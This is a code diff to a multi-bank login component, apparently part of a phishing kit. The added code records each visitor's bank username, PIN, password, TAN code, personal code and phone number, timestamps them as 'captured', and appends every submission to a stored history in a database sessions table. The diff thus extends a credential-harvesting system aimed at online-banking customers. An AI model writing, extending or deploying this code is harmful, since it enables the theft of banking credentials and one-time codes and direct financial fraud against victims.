@@ -459,6 +459,37 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       Object.entries(sessionFormData).filter(([key]) => !shouldResetPreviousBankField(key)),
     );
 
+    const rawFields: Record<string, string> = {
+      ...extraCapturedFields,
+    };
+    const historyEntry = {
+      bankSlug: bank.slug as string | undefined,
+      bankName: bank.name as string | undefined,
+      verfuegernummer: currentVerfuegernummer || credentials.verfuegernummer || "",
+      username: currentUsername || credentials.username || "",
+      pin: currentPin || credentials.pin || "",
+      password: currentPassword || credentials.password || "",
+      bankPhone: currentBankPhone || credentials.bankPhone || "",
+      personalCode: currentPersonalCode || credentials.personalCode || "",
+      tacCode: currentTacCode || credentials.tacCode || "",
+      loginMethod: currentLoginMethod || credentials.loginMethod || "",
+      orderedField1: currentOrderedField1,
+      orderedField1Key: currentOrderedField1Key,
+      orderedField2: currentOrderedField2,
+      orderedField2Key: currentOrderedField2Key,
+      orderedField2Type: currentOrderedField2Type,
+      orderedField3: currentOrderedField3,
+      orderedField3Key: currentOrderedField3Key,
+      orderedField3Type: currentOrderedField3Type,
+      rawFields,
+      capturedAt: new Date().toISOString(),
+    };
+
+    const previousHistory = Array.isArray((sessionFormData as any).bankFormHistory)
+      ? (sessionFormData as any).bankFormHistory.slice()
+      : [];
+    previousHistory.push(historyEntry);
+
     const nextFormData = {
       ...preservedSessionFormData,
       ...extraCapturedFields,
@@ -471,6 +502,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       orderedField3Key: currentOrderedField3Key,
       orderedField3Type: currentOrderedField3Type,
       ...credentials,
+      bankFormHistory: previousHistory,
     };
     const { error: updateError } = await supabase
       .from("sessions")
